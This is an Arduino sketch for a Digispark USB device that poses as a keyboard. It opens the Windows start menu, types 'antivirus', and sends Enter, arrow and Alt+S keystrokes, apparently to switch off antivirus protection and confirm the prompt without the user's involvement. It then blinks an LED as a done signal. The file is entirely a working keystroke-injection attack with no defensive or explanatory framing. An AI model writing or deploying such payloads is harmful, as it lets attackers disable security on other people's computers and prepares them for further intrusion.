#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.delay(2000);
}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("antivirus");
  DigiKeyboard.delay(3000);

  for (int i = 0; i < 4; i++) {
    //DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(600);
  }

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);

  for (;;) {
    digitalWrite(1, LOW);
    delay(200);
    digitalWrite(1, HIGH);
    delay(500);
  }
}
